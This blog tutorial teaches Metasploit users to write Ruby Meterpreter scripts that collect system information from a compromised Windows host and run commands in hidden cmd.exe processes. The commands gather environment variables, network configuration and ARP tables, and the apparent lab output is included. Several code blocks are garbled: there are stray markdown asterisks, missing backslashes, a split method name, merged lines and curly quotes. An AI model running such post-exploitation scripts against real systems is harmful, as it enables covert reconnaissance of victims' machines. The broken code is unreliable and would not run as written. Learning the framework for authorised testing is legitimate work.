---
draft: false
title: MSF Meterpreter Script Editing
linkTitle: Meterpreter Script Editing
translationKey: msf-meterpreter-script-editing
weight: 350
date: 2017-06-14T13:49:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: In this article, we will examine how to edit Meterpreter scripts.
url: /msf-meterpreter-script-editing/
featured_image: /images/metasploit.jpg
categories:
   - Metasploit Framework
tags:
   - cybersecurity
   - metasploit framework
---
## Writing Scripts

We briefly saw what the structure of the Meterpreter Script is in our previous two articles. Now, let's see what the codes return piece by piece. For this, let's write the "Hello World" ruby ​​code and save it as `helloworld.rb` in the `/usr/share/metasploit-framework/scripts/meterpreter` folder.

```bash
root@kali:~# echo "print_status("Hello World")" > /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
```

Let's run the script code we created while the meterpreter session is open.

```bash
meterpreter > run helloworld
> Hello World
meterpreter >
```

We have run a simple Ruby code in meterpreter. Now let's add a few API calls to our `helloworld.rb` file. You can add the following lines using a text editor.

```bash
print_error(“this is an error!”)
print_line(“this is a line”)
```

The lines above are an example of standard data entry and error messages. Let's run the codes we created.

```bash
meterpreter > run helloworld
> Hello World
[-] this is an error!
this is a line
meterpreter >
```

## helloworld.rb

Our script code file should finally look like the one below.

```bash
print_status("Hello World")
print_error("this is an error!")
print_line("This is a line")
```

Now let's add a function to our code. In this function, we will obtain some basic information and add an error control feature. The structure of the architecture we will create will be as follows.

```bash
def geninfo(session)
begin
…..
rescue ::Exception => e
…..
end
end
```

To create this structure, simply edit the file as follows. After making these edits, the content of our `helloworld.rb` file will be as follows.

```bash
def getinfo(session)
begin
sysnfo = session.sys.config.sysinfo
runpriv = session.sys.config.getuid
print_status("Getting system information ...")
print_status("tThe target machine OS is #{sysnfo['OS']}")
print_status("tThe computer name is #{'Computer'} ")
print_status("tScript running as #{runpriv}")
rescue ::Exception => e
print_error("The following error was encountered #{e}")
end
end
```

Let's explain step by step what these codes do. First, we defined a function called `getinfo(session)` that gets the values ​​from the `session` variable. This session variable contains some methods. The `sysnfo = session.sys.config.sysinfo` line is used to get system information while `runpriv = session.sys.config.getuid` is used to get user information. In addition, there is an exception manager that manages error conditions.

## helloworld2.rb

Let's create a `helloworld2.rb` file by making a small addition to the first file we created. The `helloworld2.rb` file is the file we just created with the getinfo(client) line added to the end. Let's add this line and save the file as `helloworld2.rb`. The final version of the file should be as follows.

```bash
 def getinfo(session)
 begin
 sysnfo = session.sys.config.sysinfo
 runpriv = session.sys.config.getuid
 print_status("Getting system information ...")
 print_status("tThe target machine OS is #{sysnfo['OS']}")
 print _status("tThe computer name is #{'Computer'} ")
 print_status("tScript running as #{runpriv}")
 rescue ::Exception => e
 print_error("The following error was encountered #{e}")
 end
 end

 getinfo(client)
```

Now let's run our `helloworld2.rb` file in the Meterpreter session.

```bash
meterpreter > run helloworld2
> Getting system information ...
> The target machine OS is Windows XP (Build 2600, Service Pack 3).
> The computer name is Computer
> Script running as WINXPVM01labuser
```

As you can see, we have obtained some system information with the `helloworld2.rb` script.

## helloworld3.rb

After the two sample code files we created above, let's look at another sample script. You can create this script file with a text editor. Its content should be as follows.

```bash
def list_exec(session,cmdlst)
print_status("Running Command List ...")
r=''
session.response_timeout=120
cmdlst.each do |cmd|
begin
print_status "running command #{cmd}"
r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true**})**
**while**(d = r.channel.read) print_status("t#{d}")
end
r.channel.close
r.close
rescue ::Exception => e
print_error("Error Running Command #{cmd}: #{e.class} #{e}")
end
end
end commands = [ "set",
"ipconfig /all",
"arp -a"] list_exec(client,commands)
```

Let's briefly look at what the above codes do. First, a function named `list_exec` is defined. This function takes two variables named `session` and `cmdlist`. It is understood from the codes that the `cmdlist` variable is a series of commands with the array method. These commands will be run on the target system via `cmd.exe`, which will be taken from the variable in order. In order to prevent the system from freezing and becoming unresponsive, `session.response_timeout=120` has been defined as a 120-second waiting period. As in the previous script code, there is also an error control line.

The `cmdlist` array variable actually runs the commands shown below in order.

```bash
commands = [ “set”,
“ipconfig /all”,
“arp –a”]
```

At the end of the commands, there is the line `list_exec(client,commands)` to run the function we created.

Now let's run the new helloworld3.rb script code we created in the Meterpreter session.

```bash
 meterpreter > run helloworld3
 > Running Command List ...
 >     running command set
 >     ALLUSERSPROFILE=C:\Documents and Settings\All Users
 APPDATA=C:\Documents and Settings\P0WN3D\Application Data
 CommonProgramFiles=C:\Program Files\Common Files
 COMPUTERNAME=TARGET
 ComSpec=C:\WINNT\system32\cmd.exe
 HOMEDRIVE=C:
 HOMEPATH=
 LOGONSERVER=TARGET
 NUMBER_OF_PROCESSORS=1
 OS=Windows_NT
 Os2LibPath=C:\WINNT\system32\os2dll;
 Path=C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem
 PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
 PROCESSOR_ARCHITECTURE=x86
 PROCESSOR_IDENTIFIER=x86 Family 6 Model 7 Stepping 6, GenuineIntel
 PROCESSOR_LEVEL=6
 PROCESSOR_REVISION=0706
 ProgramFiles=C:\Program Files
 PROMPT=$P$G
 SystemDrive=C:
 SystemRoot=C:\WINNT
 TEMP=C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
 TMP=C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
 USERDOMAIN=TARGET
 USERNAME=P0WN3D
 USERPROFILE=C:\Documents and Settings\P0WN3D
 windir=C:\WINNT >     running command ipconfig  /all
 >     
 Windows 2000 IP Configuration Host Name . . . . . . . . . . . . : target
 Primary DNS Suffix  . . . . . . . : 
 Node Type . . . . . . . . . . . . : Hybrid
 IP Routing Enabled. . . . . . . . : No
 WINS Proxy Enabled. . . . . . . . : No
 DNS Suffix Search List. . . . . . : localdomain Ethernet adapter Local Area Connection: Connection-specific DNS Suffix  . : localdomain
 Description . . . . . . . . . . . : VMware Accelerated AMD PCNet Adapter
 Physical Address. . . . . . . . . : 00-0C-29-85-81-55
 DHCP Enabled. . . . . . . . . . . : Yes
 Autoconfiguration Enabled . . . . : Yes
 IP Address. . . . . . . . . . . . : 172.16.104.145
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 172.16.104.2
 DHCP Server . . . . . . . . . . . : 172.16.104.254
 DNS Servers . . . . . . . . . . . : 172.16.104.2
 Primary WINS Server . . . . . . . : 172.16.104.2
 Lease Obtained. . . . . . . . . . : Tuesday, August 25, 2009 10:53:48 PM
 Lease Expires . . . . . . . . . . : Tuesday, August 25, 2009 11:23:48 PM >     running command arp -a
 >     
 Interface: 172.16.104.145 on Interface 0x1000003
 Internet Address      Physical Address      Type
 172.16.104.2          00-50-56-eb-db-06     dynamic   
 172.16.104.150        00-0c-29-a7-f1-c5     dynamic    meterpreter >
```

As you can see, creating script files with Ruby codes is actually very easy. At first, the codes may seem a bit confusing, but you will get used to them after working with the codes a bit. What you need to do next is to create your own script file by using the code examples and try it out.
